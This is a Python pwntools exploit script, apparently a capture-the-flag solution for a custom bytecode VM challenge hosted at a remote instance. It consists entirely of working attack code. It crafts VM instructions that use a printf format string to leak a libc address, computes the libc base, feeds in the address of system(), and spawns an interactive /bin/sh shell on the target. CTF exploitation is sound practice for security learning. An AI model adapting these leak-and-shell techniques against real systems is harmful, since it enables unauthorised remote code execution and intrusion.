from pwn import *

#p = process("./main")
#p = gdb.debug("./main", gdbscript="""
#    b *main
#    b *_ZN2VM3runEv
#    b *_ZN2VM3runEv+2928
#    c
#""")
#p = remote("localhost", 1337)
p = remote("inst-jcvlc1ifep.tls.vuln.si", 443, ssl=True)

libc = ELF("./libc.so.6")

payload =  b"\x0A\x02\x00\x01\x00\x00\x00\x00\x00\x00" # 128
payload += b"\x08%43$p\n\x00\x00"  # printf string
payload += b"\x0F\xe8"                # syscall printf@plt
payload += b"\x0F\x00"     # syscall read
payload += b"\x09\x01\x00" # mov r1 <- r0
payload += b"\x0F\x00"     # syscall read
payload += b"\x03\x01\x02" # mul r1 *= r2
payload += b"\x01\x01\x00" # add r1 += r0
payload += b"\x0F\x00"     # syscall read
payload += b"\x03\x01\x02" # mul r1 *= r2
payload += b"\x01\x01\x00" # add r1 += r0
payload += b"\x0F\x00"     # syscall read
payload += b"\x03\x01\x02" # mul r1 *= r2
payload += b"\x01\x01\x00" # add r1 += r0
payload += b"\x0F\x00"     # syscall read
payload += b"\x03\x01\x02" # mul r1 *= r2
payload += b"\x01\x01\x00" # add r1 += r0
payload += b"\x0F\x00"     # syscall read
payload += b"\x03\x01\x02" # mul r1 *= r2
payload += b"\x01\x01\x00" # add r1 += r0
payload += b"\x0F\x00"     # syscall read
payload += b"\x03\x01\x02" # mul r1 *= r2
payload += b"\x01\x01\x00" # add r1 += r0
payload += b"\x0F\x00"     # syscall read
payload += b"\x03\x01\x02" # mul r1 *= r2
payload += b"\x01\x01\x00" # add r1 += r0
payload += b"\x08/bin/sh\x00" # "/bin/sh" string on top of stack
payload += b"\x0F\xfb"     # syscall r1 (system)

print("Len:", len(payload))
p.sendline(str(len(payload)).encode())
p.sendline(payload)

ptr = p.recvline().strip()
ptr = int(ptr, 16)
libc.address = ptr - 0x2a628
log.info(f"Libc base: {hex(libc.address)}")
libc_system = libc.symbols["system"]
ptr = p64(libc_system)[::-1]
p.sendline(ptr)

p.interactive()
